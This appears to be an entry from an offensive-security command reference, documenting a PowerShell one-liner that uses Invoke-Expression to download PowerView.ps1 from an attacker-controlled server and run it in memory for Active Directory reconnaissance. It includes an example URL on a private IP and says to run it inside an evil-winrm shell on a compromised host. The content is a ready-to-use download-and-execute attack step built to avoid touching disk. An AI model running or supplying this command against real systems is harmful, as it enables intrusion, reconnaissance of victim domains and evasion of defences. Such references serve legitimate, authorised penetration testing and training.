---
type: command
executor: powershell
data: 'IEX([Net.WebClient]::new().DownloadString("$_URL/PowerView.ps1"))'
output: null
platforms:
  - Windows
tags:
  - powershell
  - ad-recon
  - download-execute
verified: true
validated: true
---

# powershell-iex-download-powerview

## Command

```powershell
IEX([Net.WebClient]::new().DownloadString("$_URL/PowerView.ps1"))
```

## Description

Downloads and executes the PowerView.ps1 script directly in memory using Invoke-Expression (IEX), loading AD reconnaissance functions without saving to disk.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_URL | URL hosting PowerView.ps1 (attacker server) | Yes |

## Examples

### Basic Usage

```powershell
IEX([Net.WebClient]::new().DownloadString("http://192.168.1.100:8000/PowerView.ps1"))
```

### In Remote Shell

Run inside evil-winrm PS prompt.

## Expected Output

No output on success; functions like Get-NetDomain become available. Test: Get-NetDomain | Select Name.

## Related

- [[procedures/windows-winrm-credential-access]]
- [[tools/Evil-WinRM]]
